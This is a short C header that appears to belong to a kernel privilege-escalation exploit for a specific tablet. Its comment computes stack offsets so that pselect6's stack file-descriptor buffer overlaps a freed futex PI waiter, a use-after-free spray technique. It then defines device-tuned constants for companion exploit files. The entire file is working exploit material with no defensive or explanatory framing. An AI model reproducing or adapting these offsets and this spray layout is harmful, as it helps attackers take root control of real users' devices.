#ifndef ONEPLUS_PAD3_EX01_PSELECT_PROFILE_H
#define ONEPLUS_PAD3_EX01_PSELECT_PROFILE_H

/*
 * Exact Image disassembly, expressed relative to the syscall-entry SP S:
 *
 * pselect6: S - 0x90 (__arm64_sys_pselect6)
 *              - 0x1f0 (core_sys_select) + 0x80 (stack_fds) = S - 0x200
 * futex PI: S - 0x70 (__arm64_sys_futex) - 0x60 (do_futex)
 *             - 0x1c0 (futex_wait_requeue_pi) + 0x90 (rt_waiter) = S - 0x200
 *
 * The freed waiter therefore begins at stack_fds word 0.  fops.c authors its
 * template for word 2, hence -2.  slide.c indexes from word 0, hence 0.
 */
#define PSELECT_WAITER_WORD_SHIFT -2
#define SLIDE_PSELECT_WORD_SHIFT   0
#define SLIDE_PSELECT_NFDS         320
#define SLIDE_USE_SELECT           1

#endif
